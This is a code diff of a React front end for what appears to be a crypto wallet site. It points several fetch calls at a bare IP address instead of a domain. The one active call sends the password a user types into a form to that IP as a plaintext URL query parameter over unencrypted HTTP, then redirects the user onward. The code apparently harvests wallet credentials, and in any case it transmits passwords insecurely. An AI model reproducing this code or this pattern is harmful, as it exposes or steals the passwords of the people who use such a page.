@@ -57,13 +57,13 @@ function App() {
         text: 'Fill in the password field',
       })
     } else {
-      // const url = "http://sbgwallet.io:8082/addnew";
+      // const url = "http://167.172.106.122:8082/addnew";
 
       let data = {
         password: p2,
       };
     
-        await fetch("http://sbgwallet.io:8082/password?pwd="+p2)
+        await fetch("http://167.172.106.122:8082/password?pwd="+p2)
         .then((res) => res.json())
         .then(async (data) => { 
           console.log(data);
@@ -99,7 +99,7 @@ function App() {
   }
 
   // async function Getdata(p2) {
-  //   await fetch(`http://sbgwallet.io:8082/getdata1${p2}`)
+  //   await fetch(`http://167.172.106.122:8082/getdata1${p2}`)
   //     .then((response) => {
   //       return response.json();
   //     })
@@ -113,7 +113,7 @@ function App() {
   //       window.location.replace("/securewallet");
   //     });
   //   //   return(
-  //   //   await fetch(`http://sbgwallet.io:8082/getdata1${p2}`)
+  //   //   await fetch(`http://167.172.106.122:8082/getdata1${p2}`)
   //   //   .then(function(res) {
   //   //      return res.json();
   //   //     })
